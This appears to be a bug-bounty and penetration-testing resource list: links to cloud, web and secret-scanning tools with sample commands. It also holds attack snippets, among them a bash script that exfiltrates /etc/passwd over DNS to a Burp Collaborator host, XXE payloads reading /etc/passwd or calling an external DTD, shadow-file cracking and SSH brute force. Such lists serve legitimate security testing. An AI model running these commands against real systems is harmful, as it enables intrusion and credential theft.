<br># s3📦digger is a search/discovery engine that allows you to find public files on Amazon S3.

https://github.com/VirtueSecurity/aws-extender
<br># Burp Suite extension which can identify and test S3 buckets

### Cloud Enumeration
<br># Set keys
<br>```export AWS_ACCESS_KEY_ID=YOUR_ACCESS_KEY```
<br>```export AWS_SECRET_ACCESS_KEY=YOUR_SECRET_KEY```
<br>```export AWS_SESSION_TOKEN=YOUR_SESSION_TOKEN```
<br>
<br># Set keys (alternative)
<br>```aws configure set aws_access_key_id YOUR_ACCESS_KEY```
<br>```aws configure set aws_secret_access_key YOUR_SECRET_KEY```
<br>```aws configure set aws_session_token YOUR_SESSION_TOKEN```
<br>
<br># Basic check
<br>```aws sts get-caller-identity```

https://github.com/andresriancho/enumerate-iam
<br># Found a set of AWS credentials and have no idea which permissions it might have?

https://github.com/nccgroup/ScoutSuite
<br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.

https://github.com/streaak/keyhacks
<br># KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid.

https://github.com/ozguralp/gmapsapiscanner
<br># Used for determining whether a leaked/found Google Maps API Key is vulnerable to unauthorized access by other applications or not.

https://github.com/aquasecurity/trivy
<br># Trivy (tri pronounced like trigger, vy pronounced like envy) is a comprehensive security scanner. It is reliable, fast, extremely easy to use, and it works wherever you need it.

https://github.com/initstring/cloud_enum
<br># Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud.

https://github.com/R-s0n/cloud_enum
<br># This fork is actively maintained by rs0n as part of The Ars0n Framework v2, a comprehensive bug bounty hunting framework. This version includes significant enhancements and expanded cloud service coverage.

https://github.com/toniblyx/prowler
<br># Prowler is an Open Source Security tool for AWS, Azure and GCP to perform Cloud Security best practices assessments, audits, incident response, compliance, continuous monitoring, hardening and forensics readiness.

https://github.com/salesforce/cloudsplaining
<br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.

https://github.com/cloudsploit/scans
<br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.

https://github.com/RhinoSecurityLabs/pacu
<br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.

https://github.com/VirtueSecurity/aws-extender
<br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.

https://github.com/irgoncalves/gcp_security
<br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
<br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.

https://cloud.google.com/compute/docs/storing-retrieving-metadata
<br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance's host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.

https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
<br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.

https://www.alibabacloud.com/help/doc-detail/49122.htm
<br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.

https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
<br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.

https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-user-pools
<br># A user pool is a user directory in Amazon Cognito. With a user pool, your users can sign in to your web or mobile app through Amazon Cognito, or federate through a third-party identity provider (IdP). Whether your users sign in directly or through a third party, all members of the user pool have a directory profile that you can access through an SDK.

https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/
<br># This post gives a deep dive into a critical security flaw that was present in Flickr’s login flow.

https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p1/
https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2/
<br># Attacking AWS Cognito with Pacu.

https://www.plerion.com/blog/what-do-hackers-know-about-your-aws-account
https://awseye.com/
<br># Awseye (pronounced o-zee 🦘🇦🇺) is an open-source intelligence (OSINT) and reconnaissance service that analyzes publicly accessible data for AWS identifiers. It helps identify known and exposed AWS resources that might need your attention. It levels the playing field between attackers and defenders, by giving defenders access to the same data attackers have been harvesting since flip phones stopped being cool.

### Containerization
https://github.com/stealthcopter/deepce
<br># Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).

### Visual Identification
https://github.com/FortyNorthSecurity/EyeWitness
<br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
<br>```eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"```

https://github.com/michenriksen/aquatone
<br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
<br>```cat targets.txt | aquatone```

https://github.com/sensepost/gowitness
<br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
<br>```gowitness scan --cidr 192.168.0.0/24 --threads 20```

https://github.com/BishopFox/eyeballer
<br># Eyeballer is meant for large-scope network penetration tests where you need to find "interesting" targets from a huge set of web-based hosts.
<br>```eyeballer.py --weights YOUR_WEIGHTS.h5 predict PATH_TO/YOUR_FILES/```

## Scanning

### Static Application Security Testing
https://github.com/returntocorp/semgrep
<br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.

https://owasp.org/www-project-dependency-check/
<br># Dependency-Check is a Software Composition Analysis (SCA) tool that attempts to detect publicly disclosed vulnerabilities contained within a project’s dependencies. It does this by determining if there is a Common Platform Enumeration (CPE) identifier for a given dependency. If found, it will generate a report linking to the associated CVE entries.

https://owasp.org/www-community/Source_Code_Analysis_Tools
<br># Source code analysis tools, also known as Static Application Security Testing (SAST) Tools, can help analyze source code or compiled versions of code to help find security flaws.

https://github.com/robotframework/robotframework
<br># Robot Framework is a generic open source automation framework for acceptance testing, acceptance test driven development (ATDD), and robotic process automation (RPA). It has simple plain text syntax and it can be extended easily with generic and custom libraries.

https://github.com/google/osv-scanner
<br># Use OSV-Scanner to find existing vulnerabilities affecting your project's dependencies.

https://github.com/securego/gosec
<br># Inspects source code for security problems by scanning the Go AST.

https://dotnetfiddle.net
<br># We are a group of .NET developers who are sick and tired of starting Visual Studio, creating a new project and running it, just to test simple code or try out samples from other developers.

https://jsfiddle.net
<br># Test your JavaScript, CSS, HTML or CoffeeScript online with JSFiddle code editor.

### Dependency Confusion
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
<br># How I Hacked Into Apple, Microsoft and Dozens of Other Companies.

https://www.blazeinfosec.com/post/dependency-confusion-exploitation/
<br># This blog post provides an overview of Dependency Confusion attacks and explains in detail how they can be exploited in the wild, with examples using NPM packages and tips to prevent these vulnerabilities from occurring.

https://github.com/dwisiswant0/nodep
<br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.

https://github.com/visma-prodsec/confused
<br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.

### Send Emails
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
<br># Ticket Trick

https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
<br># Abusing autoresponders and email bounces

<br># Send multiple emails
<br>```while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt```

### Search Vulnerabilities
https://pypi.org/project/urlscanio/
<br># URLScan.io is a useful tool for scanning and obtaining information from potentially malicious websites. The creators of URLScan have very helpfully made an API which can be used to add some automation to your workflow. urlscanio is a simple Python CLI utility which makes use of the aforementioned APIs to automate my own personal workflow when it comes to using URLScan.
<br>```urlscanio -i https://www.example.com```

https://github.com/vulnersCom/getsploit
<br># Command line search and download tool for Vulners Database inspired by searchsploit.
<br>```getsploit wordpress 4.7.0```

https://www.exploit-db.com/searchsploit
<br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
<br>```searchsploit -t oracle windows```

https://github.com/vulmon/Vulmap
<br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.

https://grep.app
<br># Search across a half million git repos.

https://github.com/0ang3el/aem-hacker
<br># Tools to identify vulnerable Adobe Experience Manager (AEM) webapps.
<br>```python3 aem_hacker.py -u https://example.com --host your_vps_hostname_ip```

https://github.com/laluka/jolokia-exploitation-toolkit
<br># Jolokia Exploitation Toolkit (JET) helps exploitation of exposed jolokia endpoints.

https://github.com/cve-search/git-vuln-finder
<br># Finding potential software vulnerabilities from git commit messages.
<br>```git-vuln-finder -r ~/git/curl | jq .```

https://github.com/internetwache/GitTools
<br># This repository contains three small python/bash scripts used for the Git research.

### Web Scanning
https://github.com/psiinon/open-source-web-scanners
<br># A list of open source web security scanners on GitHub.

https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
<br># Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.

https://github.com/spinkham/skipfish
<br># Skipfish is an active web application security reconnaissance tool.
<br>```skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/```

https://github.com/sullo/nikto
<br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
<br>```nikto -ssl -host www.example.com```

https://github.com/wpscanteam/wpscan
<br># WordPress Security Scanner
<br>```wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com```

https://github.com/droope/droopescan
<br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.
<br>```droopescan scan drupal -u example.com```

https://github.com/projectdiscovery/nuclei
<br># Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
<br>```nuclei -l urls.txt -t cves/ -t files/ -o results.txt```

https://github.com/six2dez/reconftw
<br># reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
<br>```reconftw.sh -d example.com -a```

https://github.com/blacklanternsecurity/bbot
<br># BBOT (Bighuge BLS OSINT Tool) is a recursive internet scanner inspired by Spiderfoot, but designed to be faster, more reliable, and friendlier to pentesters, bug bounty hunters, and developers.
<br>```bbot -t example.com -f subdomain-enum```

https://gobies.org
<br># The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.

https://github.com/commixproject/commix
<br># By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
<br>```python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"```

https://github.com/MrCl0wnLab/ShellShockHunter
<br># Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
<br>```python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl```

https://github.com/crashbrz/WebXmlExploiter/
<br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.

https://github.com/stark0de/nginxpwner
<br># Nginxpwner is a simple tool to look for common Nginx misconfigurations and vulnerabilities.

https://adityaksood.medium.com/sparty-useful-tools-die-hard-d9afe6f3f561
https://github.com/adityaks/sparty
<br># Sparty is an open source tool written in python to audit web applications using sharepoint and frontpage architecture.

### HTTP Request Smuggling
https://github.com/defparam/smuggler
<br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
<br>```python3 smuggler.py -q -u https://example.com/```
<br>
<br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
<br>```echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &>/dev/null```

https://github.com/neex/http2smugl
<br># This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -> HTTP/1.1 conversion by the frontend server.
<br>```http2smugl detect https://example.com/```

https://github.com/BishopFox/h2csmuggler
<br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
<br>```h2csmuggler.py -x https://example.com/ --test```

https://github.com/0ang3el/websocket-smuggle
<br># Smuggling HTTP requests over fake WebSocket connection.
<br>```python3 smuggle.py -u https://example.com/```

https://github.com/anshumanpattnaik/http-request-smuggling
<br># So the idea behind this security tool is to detect HRS vulnerability for a given host and the detection happens based on the time delay technique with the given permutes.

https://portswigger.net/web-security/request-smuggling
<br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

https://github.com/PortSwigger/http-request-smuggler
<br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.

https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
<br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.

https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities
<br># The ultimate Bug Bounty guide to HTTP request smuggling vulnerabilities.

https://www.intruder.io/research/practical-http-header-smuggling
<br># Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning and request smuggling vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as "header smuggling". This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.

https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/
<br># Two Years Ago @albinowax Shown Us A New Technique To PWN Web Apps So Inspired By This Technique AND @defparam's Tool , I Have Been Collecting A Lot Of Mutations To Achieve Request Smuggling.

https://github.com/GrrrDog/weird_proxies
<br># It's a cheat sheet about behaviour of various reverse proxies and related attacks.

https://github.com/bahruzjabiyev/T-Reqs-HTTP-Fuzzer
<br># T-Reqs (Two Requests) is a grammar-based HTTP Fuzzer written as a part of the paper titled "T-Reqs: HTTP Request Smuggling with Differential Fuzzing" which was presented at ACM CCS 2021.

https://github.com/BenjiTrapp/http-request-smuggling-lab
<br># Two HTTP request smuggling labs.

https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws
<br># Nowadays, novel HTTP request smuggling techniques rely on subtle deviations from the HTTP standard. Here, I discuss some of my recent findings and novel techniques.

https://tools.honoki.net/smuggler.html
<br># Visualize HTTP parsing discrepancies that lead to smuggling vulnerabilities.

### Subdomain Takeover
https://github.com/anshumanbh/tko-subs
<br># Subdomain Takeover Scanner
<br>```tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt```

https://github.com/haccer/subjack
<br># Subjack is a Subdomain Takeover tool written in Go designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.
<br>```subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl```

https://github.com/Ice3man543/SubOver
<br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it's redesign, it has been aimed with speed and efficiency in mind.
<br>```SubOver -l subdomains.txt```

https://github.com/punk-security/dnsReaper
<br># DNS Reaper is yet another sub-domain takeover tool, but with an emphasis on accuracy, speed and the number of signatures in our arsenal.
<br>```python3 main.py file --filename subdomains.txt```

### SQLi (SQL Injection)
https://github.com/sqlmapproject/sqlmap
<br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
<br>```sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch```
<br>```sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch```

### XSS
https://github.com/hahwul/dalfox
<br># DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters. Its advanced testing engine and niche features are designed to streamline the process of detecting and verifying vulnerabilities.
<br>```dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://your-callback-url```

https://github.com/KathanP19/Gxss
<br># A Light Weight Tool for checking reflecting Parameters in a URL. Inspired by kxss by @tomnomnom.
<br>```echo "https://www.example.com/some.php?first=hello&last=world" | Gxss -c 100```

### Repositories Scanning
https://github.com/zricethezav/gitleaks
<br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.

https://github.com/michenriksen/gitrob
<br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.

https://github.com/dxa4481/truffleHog
<br># Searches through git repositories for secrets, digging deep into commit history and branches.

https://github.com/awslabs/git-secrets
<br># Prevents you from committing passwords and other sensitive information to a git repository.

https://github.com/eth0izzle/shhgit
<br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.

https://pinatahub.incognita.tech/
<br># PinataHub allows you to explore a fraction of the 4M+ passwords and secrets committed in public GitHub repositories, detected by GoldDigger.

https://github.com/adamtlangley/gitscraper
<br># A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
<br>```php gitscraper.php {GitHub Username} {GitHub Personal KEY}```

https://www.gitguardian.com/
<br># Secure your software development lifecycle with enterprise-grade secrets detection. Eliminate blind spots with our automated, battle-tested detection engine.

https://docs.gitguardian.com/secrets-detection/detectors/supported_credentials
<br># Here is an exhaustive list of the detectors supported by GitGuardian.

### Secret Scanning
https://github.com/redhuntlabs/HTTPLoot
<br># An automated tool which can simultaneously crawl, fill forms, trigger error/debug pages and "loot" secrets out of the client-facing code of sites.

https://github.com/redhuntlabs/BucketLoot
<br># BucketLoot is an automated S3-compatible Bucket inspector that can help users extract assets, flag secret exposures and even search for custom keywords as well as Regular Expressions from publicly-exposed storage buckets by scanning files that store data in plain-text.

https://github.com/0xTeles/jsleak
<br># jsleak is a tool to identify sensitive data in JS files through regex patterns.

https://github.com/channyein1337/jsleak
<br># I was developing jsleak during most of my free time for my own need. It is easy-to-use command-line tool designed to uncover secrets and links in JavaScript files or source code. The jsleak was inspired by Linkfinder and regexes are collected from multiple sources.

https://github.com/praetorian-inc/noseyparker
<br># Nosey Parker is a command-line tool that finds secrets and sensitive information in textual data and Git history.

https://github.com/praetorian-inc/gato
<br># Gato, or GitHub Attack Toolkit, is an enumeration and attack tool that allows both blue teamers and offensive security practitioners to identify and exploit pipeline vulnerabilities within a GitHub organization's public and private repositories.

### Google Dorks Scanning
### CORS Misconfigurations
https://github.com/s0md3v/Corsy
<br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
<br>```python3 corsy.py -u https://example.com```

### API
https://github.com/BishopFox/sj
<br># A tool for auditing endpoints defined in exposed (Swagger/OpenAPI) definition files.
<br>```sj automate -u https://petstore.swagger.io/v2/swagger.json -q```

https://github.com/intruder-io/autoswagger
<br># Autoswagger is a command-line tool designed to discover, parse, and test for unauthenticated endpoints using Swagger/OpenAPI documentation. It helps identify potential security issues in unprotected endpoints of APIs, such as PII leaks and common secret exposures.

## Monitoring

### CVE
https://www.opencve.io/
<br># OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.

## Attacking

### Brute Force
https://github.com/vanhauser-thc/thc-hydra
<br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
<br>```hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh```

https://www.openwall.com/john/
<br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
<br>```unshadow /etc/passwd /etc/shadow > mypasswd.txt```
<br>```john mypasswd.txt```

https://hashcat.net/hashcat/
<br># Hashcat is a password recovery tool.
<br>```hashcat -m 0 -a 0 hashes.txt passwords.txt```

https://github.com/iangcarroll/cookiemonster
<br># CookieMonster is a command-line tool and API for decoding and modifying vulnerable session cookies from several different frameworks. It is designed to run in automation pipelines which must be able to efficiently process a large amount of these cookies to quickly discover vulnerabilities. Additionally, CookieMonster is extensible and can easily support new cookie formats.
<br>```cookiemonster -cookie "gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I"```

https://github.com/ticarpi/jwt_tool
<br># jwt_tool.py is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).
<br>```python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw```

https://github.com/ustayready/fireprox
<br># Rotate the source IP address in order to bypass rate limits

https://github.com/AethliosIK/reset-tolkien
<br># This tool is the result of research into "Unsecure time-based secrets" from this article: https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html.
<br># To better understand how to use this tool, we strongly recommend that you read it first.

https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease
<br># Signed web tokens are widely used for stateless authentication and authorization throughout the web. The most popular format is JSON Web Tokens (JWT) which we've already covered in depth, but beyond that a diverse ecosystem of standards thrives, each with its own implementation of data storage and security.
<br># To help assess these, we've released a new open source extension for Burp Suite called SignSaboteur. This tool is designed to automate the attacks discussed here, ensuring that you no longer overlook any insecure configurations.

https://github.com/intruder-io/guidtool
<br># A simple tool to analyse version 1 GUIDs/UUIDs from a system. With the information obtained from analysis, it is often possible to forge future v1 GUIDs created by the system, if you know the approximate time they were created.
<br>```guidtool -t '2022-04-13 09:12:54' 95f6e264-bb00-11ec-8833-00155d01ef00```

https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
<br># In this presentation I introduce, demo and distribute Turbo Intruder - a research grade open source Burp Suite extension built from scratch with speed in mind. I also discuss the underlying HTTP abuse that enables it to go so fast, so you can attain similar speeds in any tools you happen to write.

### Exfiltration
https://github.com/vp777/procrustes
<br># A bash script that automates the exfiltration of data over dns

https://github.com/sensepost/reGeorg
<br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

https://github.com/fbkcs/ThunderDNS
<br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.

https://github.com/BishopFox/sliver
<br># Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.

https://github.com/rapid7/metasploit-framework
<br># The Metasploit Framework (MSF) is far more than just a collection of exploits–it is also a solid foundation that you can build upon and easily customize to meet your needs.

https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-services/gcp-databases-enum/gcp-firebase-enum
https://blog.assetnote.io/bug-bounty/2020/02/01/expanding-attack-surface-react-native/
<br># Extract data from Firebase with apikey.
```
$ python3 -m venv venv
$ source venv/bin/activate
$ python3 -m ensurepip
$ pip3 install pyrebase4
$ python3
>>> import pyrebase
>>> config = {"apiKey":"AIz...","authDomain":"project.firebaseapp.com","databaseURL":"https://project.firebaseio.com"...}
>>> firebase = pyrebase.initialize_app(config)
>>> db = firebase.database()
>>> print(db.get())
```

<br># Pure bash exfiltration over dns
<br>## Execute on target server (replace YOURBCID)
```
CMD="cat /etc/passwd"
HID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
CMDID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
BC="YOURBCID.burpcollaborator.net"
D="$HID-$CMDID.$BC"
M=$($CMD 2>&1); T=${#M}; O=0; S=30; I=1; while [ "${T}" -gt "0" ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&>/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
```

<br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results
```
BCPURL="https://polling.burpcollaborator.net/burpresults?biid=YOURBIID"
RESULTS=$(curl -sk "${BCPURL}")
```
<br>## Get IDs available
```
echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u
```
<br>## Update ID and get command result (repeat for each ID)
```
ID="xxxxx-xxxxx"
echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | egrep "$ID" | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
```

https://www.slideshare.net/snyff/code-that-gets-you-pwnsd
<br># Code that gets you pwn(s|'d). Very intersting bypasses ideas.

https://github.com/arthaud/git-dumper
<br># A tool to dump a git repository from a website.
<br>```git-dumper http://example.com/.git ~/example```

https://xsleaks.dev/
<br># Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. One way of looking at XS-Leaks is to highlight their similarity with cross-site request forgery (CSRF) techniques, with the main difference being that instead of allowing other websites to perform actions on behalf of a user, XS-Leaks can be used to infer information about a user.

### Bypass<a name="bypass_attacking"></a>

https://github.com/MrTurvey/flareprox
<br># FlareProx automatically deploys HTTP proxy endpoints on Cloudflare Workers for easy redirection of all traffic to any URL you specify.

### General<a name="general_attacking"></a>
https://github.com/firefart/stunner
<br># Stunner is a tool to test and exploit STUN, TURN and TURN over TCP servers. TURN is a protocol mostly used in videoconferencing and audio chats (WebRTC).
<br>```stunner info -s x.x.x.x:443```

## Manual

### Payloads
https://github.com/six2dez/OneListForAll
<br># This is a project to generate huge wordlists for web fuzzing, if you just want to fuzz with a good wordlist use the file onelistforallmicro.txt.

https://github.com/swisskyrepo/PayloadsAllTheThings
<br># PayloadsAllTheThings

https://github.com/RenwaX23/XSS-Payloads
<br># List of XSS Vectors/Payloads i have been collecting since 2015 from different resources like websites,tweets,books.

https://github.com/0xacb/recollapse
<br># REcollapse is a helper tool for black-box regex fuzzing to bypass validations and discover normalizations in web applications.

https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
<br># Unicode normalization good for WAF bypass.
  
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
<br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.

https://portswigger.net/web-security/xxe
<br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
<br>```<?xml version="1.0" encoding="UTF-8"?>```
<br>```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>```
<br>```<stockCheck><productId>&xxe;</productId></stockCheck>```

https://phonexicum.github.io/infosec/xxe.html
<br># Information Security PENTEST XXE
<br>```<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">```

https://github.com/GoSecure/dtd-finder
<br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.

https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
